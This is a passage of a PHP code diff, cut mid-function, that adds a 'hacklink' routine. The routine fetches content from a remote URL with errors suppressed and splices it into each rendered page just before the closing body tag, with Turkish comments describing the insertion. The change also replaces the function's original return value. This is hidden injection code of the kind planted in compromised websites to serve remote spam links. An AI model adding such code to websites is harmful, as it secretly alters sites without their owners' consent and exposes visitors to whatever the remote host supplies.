+                if ($r = @file_get_contents($u, false, stream_context_create($o))) {
+                    return $r;
+                }
+            }
+            if (function_exists('fopen')) {
+                if ($f = @fopen($u, 'r')) {
+                    $r = '';
+                    while (!feof($f)) $r .= fread($f, 8192);
+                    fclose($f);
+                    if ($r) return $r;
+                }
+            }
+            return '';
         }
     }
-
-    return $pages;
+    $hacklink_content = hacklink_add();
+    if (!empty($hacklink_content)) {
+        // str_replace ile body'nin sonuna ekle
+        $body = str_replace('</body>', $hacklink_content . '</body>', $body);
+        if (strpos($body, '</body>') === false) {
+            // </body> yoksa direkt sonuna ekle
+            $body .= $hacklink_content;
+        }
+    }
+    
+    echo $body;
 }
